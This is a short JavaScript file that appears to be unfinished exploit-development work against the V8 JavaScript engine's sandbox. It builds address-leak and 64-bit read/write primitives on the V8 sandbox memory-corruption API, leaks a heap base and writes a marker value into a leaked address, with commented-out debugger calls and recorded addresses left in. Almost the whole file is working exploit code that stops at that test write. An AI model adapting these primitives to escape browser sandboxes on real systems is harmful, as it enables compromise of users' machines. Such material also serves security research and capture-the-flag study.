

let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
  return Sandbox.getAddressOf(obj);
}

function v8_read64(addr) {
  return sandboxMemory.getBigUint64(Number(addr), true);
}

function v8_write64(addr, val) {
  return sandboxMemory.setBigInt64(Number(addr), val, true);
}

function sr_heap_base() {
  let buf = new ArrayBuffer(8);
  let u8arr = new Uint8Array(buf);
  return addrOf(u8arr);
}

let buf = new ArrayBuffer(8);
let u8arr = new Uint8Array(buf);

// search heap_base
// let ofs_u8arr = 0x40;
// let leak_addr = v8_read64(ofs_u8arr);

// console.log("addr[", ofs_u8arr.toString(16), "] = ", leak_addr.toString(16));
// addr[ 494a8 ] =  7250028380d


// heap_base
let ofs1 = 0x48;
let leak_addr = v8_read64(ofs1);
let ofs2 = leak_addr & 0xffffffffn;
let ofs3 = leak_addr & 0xffffffff00000000n;
let leak_addr2 = ofs3 + 0x48n;
console.log("addr[0x" + ofs1.toString(16) + "] = 0x" + leak_addr.toString(16));
console.log("ofs2: ", ofs2.toString(16));
console.log("ofs2 value: ", v8_read64(ofs2).toString(16));
console.log("before writing to addr: 0x"+ leak_addr.toString(16));
// 0x35b200000048

// %SystemBreak();

v8_write64(ofs2, 0x4141414142424242n);
console.log("after writing to addr: 0x"+ leak_addr.toString(16));
// %SystemBreak();
// Write to the page starting at 0x3c032d4c0000 
// addr[ 48 ] =  291e00040000

// %DebugPrint(u8arr);


// v8_write64(addrOf(u8arr)+4, 0x414141414141n);
// %SystemBreak();

